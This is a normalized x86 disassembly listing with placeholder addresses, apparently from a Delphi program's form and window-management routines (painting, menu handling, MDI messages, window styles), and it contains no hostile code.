cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_434d9c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_435d5c
sub_44ea34
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4345d0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44ea64
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_434614
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44ea94
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_434ad4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_44fbcc
pop esi
pop ebx
retn
sub_44ead8
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_44eb31
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44eb38
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
sub_44eb40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_434a88
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4388e8
mov eax ebx
call sub_438a84
sub_44eb78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4196e0
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_44ebb8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438da4
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403324
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403324
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_435d5c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_4482a0
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f4e4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ee31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ee14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d520
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d39c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_449788
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee1b
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d520
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_4482a0
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f4e4
call sub_43b390
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ef5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ef38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ef1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d520
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d39c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ef22
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d520
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43b390
mov esi eax
sub_44ef3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ReleaseDC
retn
sub_44eff0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_44f03c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f518
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44f564
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_44f07c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_44f24a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41cd7c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_439044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4346f8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4334f0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_44eff0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41cd7c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_44f518
test eax eax
je r-xdata
push ebp
call sub_44eff0
pop ecx
push ebp
call sub_44eff0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_44f03c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44c264
jmp r-xdata
sub_44f25c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44d42c
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_44f2c8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44dac8
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov eax ebx
call sub_419894
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4381b4
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_419868
call sub_448de4
mov edx esi
mov eax ebx
call sub_419868
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_44f360
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_44f3dd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_44f3e8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_438930
sub_44f414
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_438930
xor edx edx
jmp r-xdata
mov eax esi
call sub_44d5a8
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_44f44c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_4343b8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_438930
sub_44f490
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4344c4
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_44f4e4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_431a40
sub_44f518
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_453088
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_453074
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44f564
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_453088
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_453074
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f5b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41375c
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_44f5e4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43b390
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_453058
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_453058
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_44f5b4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_453058
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_453044
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4138b8
call sub_403128
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_453044
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_453044
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_453044
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_44f6e8
push ebx
mov ebx eax
mov eax ebx
call sub_44f6e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_422a88
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44f710
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4388e8
mov dl 0x1
mov eax esi
call sub_44fa74
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_44faf0
mov edx eax
mov eax esi
call sub_434d54
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_438a84
mov dl 0x1
mov eax esi
call sub_44ea94
sub_44f790
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43b390
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_4453e0
mov edi eax
mov eax ebp
call sub_43b390
push eax
call DrawMenuBar
sub_44f80c
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419340
xor edx edx
mov eax ebx
call sub_446d78
sub_44f830
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_44f790
mov eax edx
mov edx ebx
call sub_419340
sub_44f858
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fa1e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_453088
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44892c
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_453074
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419340
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_453074
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
mov eax ebx
call sub_43b694
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44f790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fa25
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov dl 0x1
mov eax ebx
call sub_45091c
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43b390
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43b390
mov edx eax
mov eax esi
call sub_44892c
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43b390
push eax
call SetMenu
sub_44fa40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fa2c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_44fa9c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44fa90
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_44fb08
push ebx
mov ebx eax
mov eax ebx
call sub_43a9a8
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_44faf0
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44faf0
mov edx eax
mov eax ebx
call sub_434d54
mov edx 0xff00000f
mov eax ebx
call sub_434d54
pop ebx
retn
sub_44fb8c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43b390
push eax
call ShowWindow
sub_44fbcc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f5e4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_44f5e4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_453058
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_453044
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_44f5e4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
